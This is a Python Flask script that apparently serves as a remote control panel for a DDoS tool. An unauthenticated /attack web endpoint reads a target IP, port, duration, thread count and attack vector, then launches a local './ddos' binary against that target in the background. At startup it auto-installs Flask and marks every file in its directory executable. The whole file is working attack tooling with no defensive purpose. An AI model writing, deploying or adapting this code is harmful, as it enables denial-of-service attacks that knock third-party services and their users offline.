import os
import subprocess
import sys

# Auto install flask
os.system(f'{sys.executable} -m pip install flask --quiet')

from flask import Flask, request

app = Flask(__name__)
BINARY = "./ddos"

@app.route('/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time = request.args.get('time')
    threads = request.args.get('threads')
    vector = request.args.get('vector', '5')
    
    cmd = [BINARY, ip, port, time, threads, vector]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return f"Started: {ip}:{port} | {time}s | {threads} threads | vector {vector}"

if __name__ == '__main__':
    os.system('chmod +x *')
    app.run(host='0.0.0.0', port=8080)
